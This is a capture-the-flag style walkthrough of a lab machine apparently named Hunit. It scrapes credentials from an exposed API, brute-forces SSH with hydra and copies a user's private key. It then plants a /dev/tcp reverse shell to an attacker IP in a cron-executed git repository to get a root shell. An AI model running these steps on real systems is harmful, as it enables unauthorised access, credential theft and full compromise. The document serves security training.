#box

*Created: 1/3/2026*

### Step 1

**Tags:** #Web-Enumeration #Web-Applications #Hydra #API

**Command:**
```bash
curl http://192.168.126.125:8080/api/user/ | jq .[].login -r > users.txt
curl http://192.168.126.125:8080/api/user/ | jq .[].password -r > password.txt

hydra -L users.txt -P password.txt -f ssh://192.168.126.125:43022
```

*Port: 8080 | Asciinema Cast: [Step 1](attachments/Hunit-1.cast)*

> 
> Among the various ports we discover the presence of port 8080, hosting an /api/user endpoint that exposes a list of users and passwords. We collect all into users.txt and password.txt and then use hydra
> 
> Hydra discovers the valid credentials `dademola:ExplainSlowQuest110`
> 
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-03 18:47:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://192.168.126.125:43022/
[43022][ssh] host: 192.168.126.125   login: dademola   password: ExplainSlowQuest110
[STATUS] attack finished for 192.168.126.125 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-03 18:47:05
```

---

### Step 2

**Tags:** #SSH_Key_Authentication #SSH #SCP

**Command:**
```bash
scp -P 43022 dademola@192.168.126.125:/home/git/.ssh/id_rsa ./id_rsa
```

*Port: 43022*

> 
> On the target machine we discover an accessible /home/git/.ssh/ folder containing the private key for the user git. We download it on our end

---

### Step 3

**Tags:** #cron #Linux #backup #git #SSH_Key_Authentication #SSH

**Command:**
```bash
# We notice the presence of a .bak file for the crontab
cat /etc/crontab.bak

# We pull the git-server folder to update it with a malicious backups.sh file and push it back on the remote server
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.126.125:/git-server
```

*Port: 43022*

> 
> Once obtained the id_rsa key, when authenticating we're in a git limited shell. Since we have control over the git user and we discovered that a cronjob is running on the git-server folder we could try to pull the repository and update it with some malicious code. Finally, once the code is updated we could push it back and wait until the system pulls it back again
> 
> The crontab file shows the presence of two cronjobs:
> 
```bash
[dademola@hunit ~]$ cat /etc/crontab.bak
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

The first one seems to be executing `/root/git-server/backups.sh`. Curious, `git-server` is the same folder we identified and that we pulled.
In fact, performing a `git log` on that folder identifies different commits and one in particular shows this `backups.sh` file.
So, this file is being executed every 3 minutes, being able to alter that file with a reverse shell shall grant us a shell.
Moreover, every 2 minutes `/root/pull.sh` hints at the fact that the system pulls from the remote repository every two minutes.
To recap the plan, if we're able to:
* Modify backup.sh with a malicious script
* Push it onto the remote repository

The cronjobs shall first pull the script on the machine, and then every 3 minute that script shall be executed.
NOTE: Based on the given minute, we might have to wait 2-3 minutes to get the shell

To pull the git repositories from the target machine we require to set up an env variable on our end: [GIT_SSH_COMMAND](https://superuser.com/questions/232373/how-to-tell-git-which-private-key-to-use#:~:text=Option%202%3A%20GIT_SSH_COMMAND)

Once done that, we'll have the `git-server` downloaded on our end. This will permit us to update the `backup.sh` file and reupload it on the target machine.

---

### Step 4

**Tags:** #git #SSH_Key_Authentication #SSH #Reverse-Shell #Shells

**Command:**
```bash
echo '#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.45.245/43022 0>&1' > backups.sh

chmod +x backups.sh

git add .
git config user.name "dademola"
git config user.email "dademola@hunit"
git commit -m "Upload Malicious file"
GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master
```

*Port: 22*

> 
> Here we set up the reverse shell command, change its properties to make it executable and then push the code to the remote repository
> 
> The `git config` command is required because it's necessary to set up the git username. In this case we'll be using the known user `dademola` and `dademola@hunit` since it's the machine's name.
> 
> Finally we push it to origin master leveraging `GIT_SSH_COMMAND` as done above

---

